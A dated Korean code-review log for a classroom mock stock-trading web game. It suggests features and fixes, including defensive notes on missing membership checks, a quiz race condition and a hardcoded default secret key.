- **`get_lottery()` 방 소속 검증 없음** (`app.py:1114`): `@login_required`만 있고 요청자가 해당 방의 멤버 또는 호스트인지 확인하지 않음. 로그인된 임의 사용자가 `rid`를 추측해 다른 방의 복권 상태를 조회할 수 있음. `get_stocks()`나 `trade()` 처럼 `RoomMember.query.filter_by(room_id=rid, user_id=uid).first()` 검증을 추가해야 함.

- **`_do_reveal()` `_lottery_lock` 보유 중 다중 DB commit** (`app.py:201-221`): `_lottery_lock` 내부에서 복수의 `db.session.commit()`을 실행함. DB가 느리면 락을 오래 점유해 다른 스레드의 복권 상태 조회를 블록함. 락 범위를 in-memory 상태 변경으로만 제한하고, commit은 락 해제 후 실행하거나 단일 commit으로 합쳐야 함.

- **`startNewsPolling()` 폴링 주기 8초 하드코딩** (`app.js:810`): `setInterval(..., 8000)`이 서버 뉴스 주기 설정과 무관하게 고정됨. 진행자가 뉴스 주기를 길게 설정해도 참여자 30명 기준 분당 225회 요청이 발생함. 서버 `/api/room/<rid>/info` 또는 폴링 응답에 `news_interval_ms`를 포함해 클라이언트가 동적으로 주기를 조정하도록 개선해야 함.

- **`get_stocks()` 방 소속 검증 없음** (`app.py:654`): 방 존재 여부(`Room.query.get(rid)`)만 확인하고 요청자가 해당 방 멤버인지 확인하지 않음. 로그인된 사용자가 임의 `rid`로 다른 방의 실시간 주가를 조회할 수 있음. `get_lottery()`와 동일한 방식으로 멤버십 검증을 추가해야 함.

---

## 2026-07-17

### 추가하면 좋을 기능

- **게임 내 실제 가격 이력 기록 및 차트 표시** (`stock_service.py:281-310`, `StockService.get_history()`): 현재 차트는 현재가에서 역방향으로 랜덤 워크를 생성해 완전히 허구의 데이터를 표시함. 학생이 실제로 목격한 "삼성전자 72,000원 → 85,000원" 흐름이 차트에는 반영되지 않음. `StockService.__init__()`에 `_price_log: dict = {sym: [] for sym in STOCKS}` 링 버퍼(최대 120틱)를 추가하고 `get_price()` 호출 시 새 가격을 기록하면, 실제 게임 내 가격 변동을 차트로 보여줄 수 있어 수업 중 "왜 이 종목이 올랐을까" 토론의 근거로 활용 가능. 서버 DB 변경 불필요.

- **진행자 화면에서 종목별 보유 집계 표시** (`app.py:542-561`, `host_members()`, `RoomHolding` 모델): 현재 진행자는 학생별 총 자산만 보고 "누가 어떤 종목에 집중 투자했는지"는 알 수 없음. `GET /api/rooms/<rid>/host/holdings-summary` 엔드포인트를 신규 추가해 `RoomHolding.query.filter_by(room_id=rid)`를 종목별로 집계(`symbol → {holders: int, total_shares: int, total_value: float}`)하여 반환하면, 진행자 시장 탭에 "삼성전자 — 6명 보유 / 합계 350주" 형태로 표시 가능. 무리 행동(herd behavior) 개념 교육에 즉각 활용 가능.

- **학생별 마지막 활동 시각 표시 (미활동 감지)** (`models.py:47-54`, `RoomMember`, `app.py:724-767`, `trade()`): 진행자가 화면을 보고 있어도 실제로 어떤 학생이 아무것도 하지 않고 있는지 파악 불가. `RoomMember`에 `last_active_at = db.Column(db.DateTime, nullable=True)` 컬럼을 추가하고 `trade()`, `create_deposit()`, `submit_quiz()` 등에서 갱신하면, `host_members()` 응답에 `idle_seconds` 를 포함할 수 있어 "5분 이상 거래 없음 ⚠️" 경고를 진행자 순위표에 표시 가능. 수업 중 소극적 참여자 조기 개입에 직접 기여.

- **복권 번호 자동 선택 버튼 (참여자)** (`app.js` 복권 오버레이, `index.html:484-509`): 복권 참가자 UI에서 학생이 60초 안에 1~45 숫자 6개를 직접 클릭해야 하는데, 화면이 작거나 손이 느린 학생은 시간 초과 빈발. 번호 선택 영역 하단에 `<button onclick="autoPickLottery()">자동 선택</button>` 하나와 `function autoPickLottery() { const nums = [...Array(45)].map((_,i)=>i+1).sort(()=>Math.random()-.5).slice(0,6).sort((a,b)=>a-b); /* 기존 picks 배열에 반영 */ }` 약 10줄 추가로 구현. 서버 변경 불필요.

- **참여자 로비에서 게임 설정 미리보기 개선** (`app.js:555-586`, `enterParticipantLobby()`, `index.html:340-352`): 현재 로비 대기 화면은 "시작 자금 · 게임 시간 · 예금 금리" 세 줄만 한 줄로 표시. 복권/룰렛 등장 주기, 퀴즈 유무 등 핵심 규칙을 작은 카드 형태로 미리 표시하면 게임 시작 전 학생들이 전략을 세울 수 있음. `plobby-settings` 요소(`index.html:350`)의 단순 텍스트를 카드 그리드로 교체하는 것만으로 완성. 서버 변경 불필요, CSS/HTML 수정만 필요.

- **퀴즈 집계 통계 (진행자용)** (`app.py:1244-1342`, `_quiz_state`): 진행자가 퀴즈를 세팅했어도 어떤 문제에서 많이 틀렸는지 파악 불가. `_quiz_state`에 현재 개인 쿨다운만 저장되므로 `_quiz_stats` 글로벌 딕셔너리 `{rid: {qid: {correct: int, wrong: int}}}` 를 추가하고 `submit_quiz()` 응답 처리 시 카운트를 갱신. `GET /api/rooms/<rid>/host/quiz-stats` 엔드포인트를 신규 추가해 진행자에게 문제별 정답률을 표시하면 수업 후 복습 포인트 파악에 활용 가능.

---

### 제거/단순화할 것들

- **`get_history()` 차트가 실제 게임 가격을 반영하지 않는 근본적 불일치** (`stock_service.py:281-310`): `force_price()` 호출 시 `_history_cache` 무효화(`stock_service.py:227-229`)가 있지만, 재생성 시 여전히 완전 랜덤 데이터를 만들어냄. "강제 상승" 직후 차트가 오히려 하락세로 보이는 상황이 발생할 수 있음. 단기적으로는 차트 기간 탭에서 "1일" 탭에 게임 내 실제 가격(위 제안 참고)을 표시하고, 나머지 기간 탭은 숨기거나 "게임 중에는 실시간 차트만 제공됩니다" 문구로 교체하는 것이 학생 혼란을 줄이는 현실적 개선.

- **`_room_cache` TTL(1.5초) 대비 폴링 간격(10초) 불일치로 사실상 캐시 무용** (`app.py:42-64`, `app.js:269`): 참여자 폴링은 10초 간격, 진행자 폴링도 10초 간격인데 캐시 TTL은 1.5초. 10초 간격으로 도착하는 요청들이 1.5초 캐시를 활용할 확률은 거의 0에 가까움(복수 사용자가 동시에 폴링하는 순간 외). TTL을 8~9초로 늘리거나(`ROOM_CACHE_TTL = 8`), Render 무료 티어 DB 부담 감소를 위해 캐시를 유지한다면 TTL을 의미 있게 늘려야 효과 발생.

- **학번+이름 공백 결합 방식이 이름에 공백 포함 시 엑셀 파싱 오류** (`app.js:73-79`, `app.py:1435`): `doAuth()`에서 `"${sid} ${name}"`으로 결합하고 `export_rankings()`에서 `u.username.split(' ', 1)`로 분리. "김 철수"처럼 이름에 공백이 있으면 학번=`김`, 이름=`철수`로 잘못 분리되어 엑셀 학번 열이 오염됨. 구분자를 `|`(파이프)나 `\t`(탭)으로 변경하고 `split('|', 1)` 또는 `split('\t', 1)`으로 분리하면 해결. `app.js:75`와 `app.py:1435` 두 곳만 수정하면 됨.

- **`_quiz_settings` 서버 재시작 시 초기화** (`app.py:1246`, `_quiz_settings: dict = {}`): 진행자가 퀴즈 보상률을 3%로 올려놓았더라도 Render 무료 티어 dyno가 재시작되면 기본값(1%/0.5%)으로 리셋됨. 게임 중 이런 일이 발생하면 학생이 예상치 못한 낮은 보상을 받게 됨. `Room` 모델에 `quiz_reward_pct = db.Column(db.Float, default=1.0)`, `quiz_penalty_pct = db.Column(db.Float, default=0.5)` 컬럼을 추가하고 `quiz_settings()` 엔드포인트에서 DB에 저장·조회하면 재시작에도 설정 유지. `models.py`에 컬럼 2개, `app.py` 수정 약 10줄.

- **`lobby_members()` 엔드포인트 접근 제한 부재** (`app.py:577-585`): `@login_required`와 404 처리만 있고, 요청자가 해당 방의 호스트이거나 멤버인지 확인하지 않음. 로그인된 임의 사용자가 방 ID만 알면 다른 방 참가자 학생 이름 목록을 열람 가능. `app.py:581`에 `room = Room.query.get_or_404(rid); user = cur_user(); if user.id != room.host_id and not RoomMember.query.filter_by(room_id=rid, user_id=user.id).first(): return jsonify({'error':'권한 없음'}), 403` 를 추가하면 해결. (이 항목은 이전 분석에서도 지적됐으나 아직 미반영 상태임을 재확인.)



---

## 2026-06-23 (2차)

### 추가하면 좋을 기능

- **복권 번호 자동 선택 버튼** (app.js: 복권 참가자 UI, `_lotParticipantPicks` 관련 로직): 학생들이 60초 타이머 내에 1~45에서 숫자 6개를 직접 입력하다 시간 초과하는 경우가 많음. "자동 선택" 버튼 하나를 추가해 `Array.from({length:45},(_,i)=>i+1).sort(()=>Math.random()-0.5).slice(0,6).sort((a,b)=>a-b)` 로 랜덤 번호 6개를 자동 입력하면 해결. 서버 변경 불필요하며, 버튼 하나와 5줄 JavaScript로 구현 가능. 수업 중 복권 라운드 원활한 진행에 직접 기여.

- **시장 탭 가격 상승·하락 플래시 애니메이션** (`app.js:1287-1330`, `filterStocks()`, `renderGrid()`): `renderGrid(filtered, prevPrices)`에서 이미 `prevPrices`를 받아 가격 변동 방향을 알 수 있음. 가격이 오른 카드에 0.5초짜리 초록 배경, 내린 카드에 빨간 배경 CSS 애니메이션 클래스를 일시 적용하면 학생들이 가격 변동을 즉각 인지. CSS `@keyframes flashUp { from {background:rgba(63,185,80,.25)} to {background:transparent} }` + `renderGrid()` 내 `if (prevPrices[st.symbol] && prevPrices[st.symbol] !== st.price) { setTimeout(() => card.classList.add(flashCls), 0); }` 패턴으로 서버 변경 없이 구현. 학생 몰입도 향상 효과가 큼.

- **결과 화면 인쇄 기능** (`app.js:loadResults()`, `static/css/style.css`): 현재 게임 결과를 공유하려면 엑셀 다운로드만 가능하고 직접 인쇄 방법이 없음. 결과 화면(screen-results)에 `<button onclick="window.print()">인쇄하기</button>` 버튼 한 개와 `@media print { .btn, .nav-bar { display:none } #screen-results { display:block !important } }` CSS를 추가하면 엑셀 미설치 환경(Chromebook 등)에서도 수업 결과물 출력 가능. 구현 시간 10분 미만.

- **학생 간 현금 이체(선물하기) 기능** (`app.py` 신규 엔드포인트 `POST /api/rooms/<rid>/transfer`): 경제 수업에서 "거래", "기부", "증여세" 개념을 실습하기 위해 학생 A가 B에게 현금을 이체하는 기능을 추가. `m_from.cash -= amount`, `m_to.cash += amount`, `RoomTransaction(action='TRF', note=f'{sender} → {receiver}')` 두 건 삽입으로 ~30줄 구현. 수혜자 측에도 `toast('친구에게 선물 받음!')`을 다음 폴링 시 띄우려면 `RoomMember`에 `pending_notice` 컬럼을 추가하거나 트랜잭션 조회로 감지하면 됨. 관련 교육 주제(기회비용, 자원 배분)와 연계 가능.

- **복권 참가자 제출 현황 실시간 표시(진행자)** (`app.py:1114-1147`, `app.js: _startLotPolling` 관련): 진행자가 복권 진행 중 누가 번호를 제출했는지 알 방법이 없음. `get_lottery()` 응답에 `all_picks_status: {uid: bool}` (호스트 전용) 필드를 추가하고, 진행자 복권 모달에 참가자별 체크리스트(✅ 제출 / ⏳ 미제출)를 표시하면 "아직 번호 입력 못 한 학생이 있어요"를 즉시 파악 가능. `cur.get('picks', {})` 에서 제출 여부를 알 수 있으므로, `app.py:1141` 호스트 조건 블록에 `'picks_submitted': list(cur.get('picks',{}).keys())` 필드를 추가하는 것만으로 구현 시작 가능.

- **진행자 멤버 목록에서 학생별 섹터 집중도 표시** (`app.py:542-561`, `app.js:408-431`): 현재 진행자 순위 목록은 이름·수익률·총 자산만 표시. `host_members()` 응답에 `top_sector: str` 필드를 추가해 (`RoomHolding` 조회 + 섹터별 현재가 합산) 가장 비중 높은 섹터를 반환하면, 진행자 화면에서 "삼성전자 60% (반도체)"처럼 간략 표시 가능. 수업 중 "이 학생은 왜 반도체 집중 투자를 했을까요?" 교육 개입 포인트를 실시간으로 제공.

---

### 제거/단순화할 것들

- **`host_force_price()` 후 뉴스 캐시 미무효화** (`app.py:673-687`): `host_force_price()`는 내부적으로 `svc.force_price()`를 호출하고, `force_price()`는 `stock_service.py:234-240`에서 `self._news`를 직접 갱신함. 그러나 `app.py:687` 응답 직전에 `_invalidate_news_cache(rid)` 호출이 없어, 뉴스 캐시 TTL(2초) 이내에 폴링하는 참여자는 이전 캐시 뉴스를 받아 강제 가격 변동 연계 뉴스를 놓침. `host_send_news()`(`app.py:700`)에는 동일 무효화 호출이 있으므로, `app.py:686` `return jsonify(...)` 직전에 `_invalidate_news_cache(rid)` 한 줄만 추가하면 일관성 확보.

- **`lobby_members` 엔드포인트에 방 소속 검증 없음** (`app.py:577-585`): `lobby_members()`는 `@login_required`와 `Room.query.get_or_404(rid)`만 수행하고, 요청자가 해당 방의 호스트이거나 멤버인지 확인하지 않음. 로그인된 사용자라면 임의의 `rid`로 다른 방 참가자 목록을 열람할 수 있는 정보 노출 취약점. `if cur_user().id != room.host_id and not RoomMember.query.filter_by(room_id=rid, user_id=cur_user().id).first(): return jsonify({'error':'권한 없음'}), 403` 를 `app.py:581` 직후에 추가하면 방어 가능.

- **`submit_quiz()` 쿨다운 갱신이 비원자적 — 동시 제출 시 이중 보상 가능** (`app.py:1278-1341`): `state = _quiz_state.get(key)` 확인과 `_quiz_state[key] = {... 'cooldown_until': time.time()+60 ...}` 갱신 사이에 잠금이 없음. 같은 학생이 두 개 탭에서 거의 동시에 POST를 보내면 두 요청 모두 `cooldown_until == 0`을 읽고 각각 보상을 지급받을 수 있음. 단순 해결책: `app.py:1281` 상단에서 state를 읽기 전에 `_quiz_state[key] = {'qid': state.get('qid'), 'cooldown_until': time.time()+60, ...}`을 먼저 갱신(선점)한 뒤 정답 여부를 처리하면, 두 번째 요청이 도달할 때는 이미 쿨다운 상태여서 차단됨.

- **`minigame_close()`가 `Room.query.get(rid)` 사용** (`app.py:976`): `minigame_close()` 내 `room = Room.query.get(rid)`는 `Room.query.get_or_404` 대신 구 SQLAlchemy 1.x 스타일의 `.get()`을 그대로 사용 중. 2026-06-14 항목에서 전체 `.get_or_404()` 교체를 권장했으나 이 한 줄은 `.get()` 형태라 빠진 것으로 보임. `db.session.get(Room, rid)` 또는 `Room.query.get_or_404(rid)`로 교체하고, `None` 반환 시 조기 반환(`if not room: return jsonify({'ok': True})`) 처리 추가 권장 (`app.py:976-977`).

- **`export_rankings()` 게임 종료 후에도 `StockService.get_price()` 호출** (`app.py:1430-1439`): `_end_room()` 실행 시 모든 보유 주식을 현재가로 현금 청산하고 `RoomHolding`을 삭제하며 `cleanup_room_service(room.id)`를 호출함 (`app.py:144-154`). 따라서 게임 종료 후 `export_rankings()`에서 `member_total_value(rid, m.user_id)`를 호출하면, 보유 주식이 없으므로 `RoomHolding` 쿼리 결과가 빈 배열이고 `get_price()`도 불필요. `room.status == 'ended'` 조건에서는 `member_total_value()` 대신 `m.cash`를 직접 사용하도록 분기 추가 시 N+1 쿼리 제거와 함께 `StockService`가 없어도 안전하게 동작.

- **`doRouletteSpin()` 예외 발생 시 `_rltSpinning = true` 고착** (`app.js:1032-1097`): `_rltSpinning = true` 설정 이후 `await new Promise(r => setTimeout(r, 4300))` (스핀 애니메이션 대기) 중에 예외가 발생하거나 연결이 끊어지면 `_rltSpinning`이 `true`로 남아 스핀 버튼이 영구 비활성화됨. 현재 `data.error` 경로에서만 `_rltSpinning = false`가 실행됨 (`app.js:1047`). `_rltSpinning = true` 이후 로직 전체를 `try { ... } finally { _rltSpinning = false; }` 로 감싸면 모든 예외 경로에서 상태가 정리됨. 단, 스핀 성공 시에도 `_rltSpinning = false` 는 명시적으로 필요하므로 (`app.js:1096`에 이미 있음) finally 블록과 충돌하지 않음.

---

## 2026-06-23

### 추가하면 좋을 기능

- **방 코드에서 혼동하기 쉬운 문자 제거** (`models.py:8-13`): `gen_code()`가 `string.ascii_uppercase + string.digits` 전체에서 6자리 코드를 생성해 `0`과 `O`, `1`과 `I`/`L`처럼 구분하기 어려운 문자가 포함될 수 있음. 학생들이 프로젝터에서 코드를 보고 손으로 입력할 때 실수하는 주된 원인. `BCDFGHJKLMNPQRSTVWXYZ23456789` 처럼 혼동 가능 문자를 제외한 집합으로 교체하면 입력 오류를 크게 줄일 수 있음 — `models.py:8`의 문자열 한 줄 변경으로 해결 가능.

- **퀴즈 타임아웃을 오답 패널티 없이 처리** (`app.js:876-877`, `app.py:1282-1342`): `submitQuiz(null)` (시간 초과) 시 클라이언트가 `answer: false`를 서버로 보내 오답과 동일한 패널티를 부과함. 시간 초과는 의도적 오답이 아니므로 교육 맥락에서는 패널티 없이 단순 쿨다운만 적용하는 것이 적절. `submit_quiz()` (`app.py:1270`) 호출 시 `timed_out` 파라미터를 추가하거나, 클라이언트에서 `answer: null`을 전송해 서버에서 `if d.get('answer') is None: penalty = 0`으로 분기 처리 권장.

- **`S.assetHistory` 120포인트 상한으로 장기 게임 차트 잘림** (`app.js:752`): 10초 폴링 기준으로 120포인트 = 최근 20분 분량만 유지됨. 60분 이상 게임에서는 자산 변화 차트가 마지막 20분만 표시되어 전체 추세를 볼 수 없음. `S.room.duration_minutes * 6 + 10`(분당 6포인트 기준)처럼 게임 시간에 비례하는 동적 상한값으로 변경하거나, 포트폴리오 탭 진입 시 전체 이력 중 마지막 N개만 렌더링하는 방식 권장 (`app.js:1506-1539` 차트 렌더링 부분 참조).

- **진행자 생성 화면의 "학번" 필드가 교사에게 부적합** (`index.html:51-60`, `app.js:122`): 진행자 생성 화면에 "학번" 필드가 있어 교사도 학번을 입력해야 함. 교사는 학번이 없으므로 혼란스럽고 빈칸 제출 시 유효성 검사 오류가 남. 레이블을 "번호/교번 (선택)"으로 변경하거나 선택 입력으로 바꾸고, 비어 있으면 이름만으로 username을 구성하도록 `doCreateRoom()` 로직을 수정하면 교사 사용 경험이 개선됨.

- **Render 무료 티어 슬립 후 진행 중인 게임의 주가 초기화** (`stock_service.py:318-322`, `app.py:120-163`): Render 무료 티어는 15분 비활성 후 dyno를 재시작함. 재시작 시 `get_room_service(rid)`가 새 `StockService` 인스턴스를 생성해 `_init_prices()`가 다시 실행되므로 모든 종목 가격이 새 무작위값으로 초기화됨. 게임 도중 교사 탭이 15분 이상 백그라운드에 있다가 돌아오면 주가가 완전히 달라져 있을 수 있음. 단기 해결책으로 `GET /api/ping` 같은 헬스체크 엔드포인트를 추가하고 외부 cron(예: UptimeRobot)으로 10~14분마다 핑하면 슬립을 방지할 수 있음. 중장기적으로는 가격 상태를 DB에 영속화하는 것이 근본 해결책.

---

### 제거/단순화할 것들

- **`RoomMember.cash` 등 금액 컬럼이 `Float` 타입** (`models.py:52`, `models.py:62`, `models.py:77`, `models.py:88`): `RoomMember.cash`, `RoomHolding.avg_price`, `RoomTransaction.price/amount`, `Deposit.amount` 모두 `db.Column(db.Float)`으로 선언되어 있음. 부동소수점 정밀도 문제로 이자 계산·포트폴리오 집계 등에서 오차가 누적될 수 있음. SQLite 환경에서는 당장 체감하기 어렵지만 PostgreSQL 이전 시 두드러짐. `db.Numeric(precision=18, scale=2)` 또는 정수(원 단위)로 변경하고 `round()` 호출에 의존하지 않는 것이 장기적으로 안전.

- **`_room_cache` TTL 1.5초가 폴링 주기 10초보다 훨씬 짧아 캐시 히트 불가** (`app.py:45`): `ROOM_CACHE_TTL = 1.5`초인데 클라이언트 폴링 주기는 10초. 캐시 생성 후 1.5초면 만료되므로 다음 폴링(약 8.5초 후)이 도착할 때는 항상 캐시 미스 상태. 동시에 여러 참여자가 폴링하는 짧은 창에서만 캐시 효과가 있음. TTL을 폴링 주기보다 약간 짧게(예: 8초)로 늘리면 같은 10초 사이클 내 여러 참여자의 중복 DB 조회를 방지하는 효과가 훨씬 커짐.

- **`openpyxl` import가 라우트 함수 내부에 선언됨** (`app.py:1422-1424`): `import openpyxl`과 `from openpyxl.styles import ...`가 `export_rankings()` 함수 안에 있음. 파이썬이 모듈을 캐싱하므로 큰 문제는 아니지만, `openpyxl` 미설치 오류가 서버 시작 시 즉시 드러나지 않고 첫 엑셀 다운로드 요청(수업 종료 직후)까지 숨겨짐. 모듈 최상단(`from flask import ...` 근처)으로 이동하면 패키지 누락이 배포 시작 즉시 감지됨.

- **`_prev` 가격이 게임 시작 이후 갱신되지 않아 `change_pct`가 누적 변동률이 됨** (`stock_service.py:127`): `self._prev[sym] = start`로 초기화 후 `get_price()`가 가격을 업데이트해도 `_prev`는 변하지 않음. `get_prev_close()`가 항상 게임 시작 가격을 반환하므로 `change_pct`는 "직전 대비"가 아닌 "게임 시작 이후 누적 변동률"을 표시함. 30분 게임 후반에는 변동률이 ±30% 이상이 되어 실제 주식 화면과 달리 느껴짐. `get_price()` 내 `self._prices[symbol] = (now, new_price)` 직전에 `self._prev[symbol] = price`를 추가하면(`stock_service.py:185` 근처) 실제 "직전 TTL 대비" 변동률 표시가 가능해짐.

- **참여자 폴링에서 `refreshMyRank()`와 순위 탭 `loadParticipantRankings()`가 rankings API를 중복 호출** (`app.js:647-649`): 10초 폴링 루프 마지막 두 줄이 각각 `refreshMyRank()`(rankings API 호출)와 `if (S.currentPage === 'rankings') loadParticipantRankings()`(또 rankings API)를 실행함. 순위 탭이 열려 있을 때 매 10초마다 동일한 `GET /api/rooms/<rid>/rankings`가 2번 발생. `loadParticipantRankings()` 완료 후 그 응답에서 `data.find(e => e.is_me)`로 헤더 통계를 갱신하도록 통합하거나, 순위 탭이 활성화된 경우 `refreshMyRank()` 별도 호출을 생략하면 API 요청 1건 절약.

---

## 2026-06-10

### 추가하면 좋을 기능

- **게임 일시정지 버튼** (`app.py:176-188`, `index.html:161-163`): 수업 중 갑작스러운 상황(화재 대피, 기술 오류 등)에 대비해 진행자가 타이머를 멈추고 거래를 차단할 수 있는 pause/resume API와 버튼이 필요함. 현재는 시작 후 종료 외에 선택지가 없음.

- **"전량 매수/매도" 버튼** (`index.html:401-415`, `app.js:699-727`): 주식 모달에 "최대 수량" 또는 "전량 매도" 버튼 추가. 학생들이 잔액으로 살 수 있는 최대 주수를 자동 계산해 주면 수업 몰입도 향상. `Math.floor(port.cash / S.tradePrice)` 로 계산 가능.

- **거래 후 모달 내 보유 수량 갱신** (`app.js:714-727`): `execTrade()` 성공 후 `ms-holding` 요소가 업데이트되지 않아 사용자가 매수/매도 직후 모달에서 잘못된 보유 수량을 봄. `openStockModal`을 재호출하거나 보유 수량만 따로 갱신하는 로직 추가 필요.

- **참여자 순위 페이지 자동 새로고침** (`app.js:546-550`): 순위 탭(`pg-rankings`)은 진입 시 한 번만 로드됨. `showPage('rankings')` 호출 시 setInterval로 주기적 갱신하거나, 글로벌 poll loop(`app.js:422-434`)에 rankings 탭 활성 시 `loadParticipantRankings()` 호출 추가.

- **게임 시작 확인 대화상자** (`app.js:191-199`): 종료 버튼(`doEndGame`)에는 `confirm()`이 있지만 시작 버튼에는 없음. 실수로 눌러 학생들이 준비 전에 게임이 시작될 수 있으므로 `doStartGame()`에도 확인 단계 추가.

- **방 코드 충돌 재시도 처리** (`models.py:8-9`, `models.py:25`): `gen_code()`가 중복 코드를 생성할 경우 SQLAlchemy가 `IntegrityError`를 발생시키고 500 오류가 반환됨. `create_room` 라우트에서 루프로 재시도하는 로직 추가 권장.

- **진행자 로비에서 참여자 강퇴 기능** (`index.html:97-108`): 로비에서 잘못 입장한 학생을 진행자가 제거할 수 없음. `DELETE /api/rooms/<rid>/members/<uid>` 엔드포인트와 버튼 추가 고려.

- **종목 가격 차트 히스토리 캐싱** (`stock_service.py:168-189`): `get_history()`는 매 요청마다 새로운 무작위 OHLC 데이터를 생성함. 학생이 모달을 열었다 닫으면 차트가 완전히 바뀌어 혼란 유발. 세션(또는 방) 단위로 히스토리를 한 번 생성해 캐싱하면 일관된 차트 제공 가능.

- **거래 내역 타임스탬프 KST 표기** (`app.py:435`): `t.timestamp.strftime('%m-%d %H:%M')`은 UTC 기준이라 한국 학생들이 보는 시간이 실제보다 9시간 뒤처짐. `+ timedelta(hours=9)` 또는 `pytz`/`zoneinfo`로 KST 변환 후 출력 필요.

---

### 제거/단순화할 것들

- **app.js의 포모도로 잔여 코드 (~200줄)** (`app.js:1109-1359`): 포모도로 기능이 `/pomodoro` 독립 페이지로 이전된 후 `_PT_REMOVED` 객체와 `ptGetAudio`, `ptBeep`, `ptPlayDone`, `ptFormatTime`, `ptFormatTotal`, `ptUpdateUI`, `ptSwitchMode`, `ptHandleComplete`, `ptToggle`, `ptReset`, `ptCustomChange`, `ptInitTicks` 함수들이 app.js에 그대로 남아 있음. 약 200줄의 데드 코드 — 전부 삭제 가능.

- **`refreshTotalAsset()` 중복 API 호출** (`app.js:709-727`): `execTrade()` 성공 시 `refreshTotalAsset()`(portfolio API)과 `refreshMyRank()`(rankings API)를 둘 다 호출함. rankings 응답에 이미 `total_value`가 포함되어 있으므로 portfolio API 호출을 제거하고 rankings 결과로 헤더 자산 표시를 갱신하면 요청 1건 절약.

- **진행자 바 차트 매번 재생성** (`app.js:300-337`): `renderHostBarChart()`는 10초마다 `S.hostBarChart.destroy()` 후 새 Chart 객체를 만들어 깜빡임과 불필요한 DOM 조작 발생. Chart.js의 `chart.data.datasets[0].data = values; chart.update()` 패턴으로 교체하면 부드럽게 갱신 가능.

- **글로벌 주식 서비스 싱글톤** (`stock_service.py:192`): `stock_service`가 서버 전체에서 공유되어 동시에 여러 교사가 게임을 운영할 경우 모든 방이 동일한 주가와 뉴스를 공유함. 지금은 단일 교실용이지만 확장성을 위해 향후 방 ID별 독립 인스턴스 또는 가격 시드를 방 단위로 관리하는 방안 고려.

- **`app.py:606`의 `debug=True`** (`app.py:606`): `if __name__ == '__main__'` 블록에 `debug=True`가 하드코딩되어 있음. 개발 중에는 무관하지만 환경 변수로 분리하거나(`debug=os.environ.get('FLASK_DEBUG','0')=='1'`) 제거하는 것이 안전.

- **`cur_user()` deprecated Query.get 패턴** (`app.py:30`): `User.query.get(session['user_id'])`는 SQLAlchemy 2.0에서 폐기됨. 전체 코드에서 `.query.get(id)` 패턴을 `db.session.get(Model, id)`로 일괄 교체 권장 (`app.py:30`, `app.py:65`, `app.py:125`, `app.py:209`, `app.py:249` 등 다수).

- **교육 콘텐츠 정적 하드코딩** (`education_data.py`): 용어사전·가이드·팁이 파이썬 파일에 하드코딩되어 있어 내용 수정 시 재배포 필요. 단기적으로는 JSON 파일로 분리해 재시작 없이 수정 가능하게 하는 것만으로도 유지보수성이 크게 향상됨.

---

## 2026-06-11

### 추가하면 좋을 기능

- **뉴스 히스토리 피드** (`app.js:507-526`, `app.py:323-327`): 폭탄뉴스 팝업은 3초 후 자동으로 사라지고(`app.js:644`) 재확인 방법이 없음. 서버에서 최근 뉴스 5~10개를 리스트로 반환하는 `GET /api/rooms/<rid>/news/history` 엔드포인트를 추가하고, 시장 탭 상단에 접을 수 있는 뉴스 피드를 두면 늦게 본 학생도 정보를 놓치지 않음.

- **진행자 "시간 연장" 버튼** (`app.py:177-189`, `index.html:170-173`): 게임 시작 후 조기 종료만 가능하고 시간 연장은 불가. 수업 시간이 늘어나거나 마무리 토론이 필요할 때 진행자가 `N분 연장`할 수 있는 `POST /api/rooms/<rid>/extend` 엔드포인트와 버튼 추가 시 현장 유연성 대폭 향상.

- **퀴즈 제출 게임 종료 후 차단** (`app.py:579-609`): `submit_quiz()`가 `room.status == 'active'` 여부를 확인하지 않음. 게임이 끝난 직후 퀴즈 창이 열려 있던 학생이 제출하면 `ended` 상태인 방의 `RoomMember.cash`가 여전히 변경됨. `app.py:581` 직후에 `if room.status != 'active': return jsonify({'error': '게임이 종료되었습니다'}), 400` 체크 추가 필요.

- **인게임 가격 이력 기록 및 차트 연동** (`stock_service.py:201-222`): `get_history()`는 현재 가격에서 역으로 무작위 OHLC 데이터를 생성해 모달을 열 때마다 완전히 다른 차트가 표시됨. 실제 게임 중 가격 변경 이벤트를 `_price_log: list[tuple[float, float]]` 형태로 `StockService`에 축적하고 이를 차트 데이터로 활용하면 학생들이 의미 있는 추세를 분석할 수 있음 (`stock_service.py:134-147` 가격 갱신 시 로그 추가).

- **엑셀 내보내기에 종목별 거래내역 시트 추가** (`app.py:631-701`): 현재 엑셀에는 최종 순위 시트 하나만 있음. `RoomTransaction` 테이블을 활용해 학생별 거래 내역을 두 번째 시트로 추가하면 교사가 어떤 전략을 썼는지 사후 분석 가능 (`app.py:681` `wb.create_sheet('거래내역')`으로 확장).

- **게임 참여 후 늦은 입장 알림** (`app.py:156-167`, `app.js:120-143`): `join_room()`은 `active` 상태 방에도 조용히 입장시켜 학생이 게임 도중에 참가했다는 사실을 인지하지 못함. 응답에 `late_join: true` 플래그를 추가하고 프론트에서 "게임이 이미 진행 중입니다. N분 경과" 경고를 표시하면 혼란 방지.

- **진행자 퀴즈 통계 패널** (`app.py:560-609`): 진행자 화면에서 어떤 학생이 퀴즈를 풀었는지, 정답률이 얼마인지 볼 수 없음. `_quiz_state` 딕셔너리를 확장해 정답/오답 횟수를 기록하고 진행자 대시보드에 퀴즈 통계 카드를 추가하면 수업 참여도 파악에 도움.

---

### 제거/단순화할 것들

- **`member_total_value()` N+1 쿼리** (`app.py:33-43`, `app.py:427-443`): 순위 조회 시 참여자 수만큼 루프를 돌며 `RoomHolding`·`Deposit` 쿼리를 반복 실행. 학생 30명 기준 최소 60회 추가 쿼리 발생. `RoomHolding.query.filter_by(room_id=rid).all()`로 보유 종목을 한 번에 가져온 뒤 딕셔너리로 그룹화하면 O(N) → O(1) 쿼리로 단순화 가능.

- **`SECRET_KEY` 하드코딩 기본값** (`app.py:12`): `'mock-stock-game-secret-2024'`가 기본값으로 노출되어 있어 환경변수를 설정하지 않으면 누구나 세션 쿠키를 위조할 수 있음. `os.environ.get('SECRET_KEY')` 만 남기고 값이 없으면 `RuntimeError`로 서버 시작을 막는 방식으로 변경 권장.

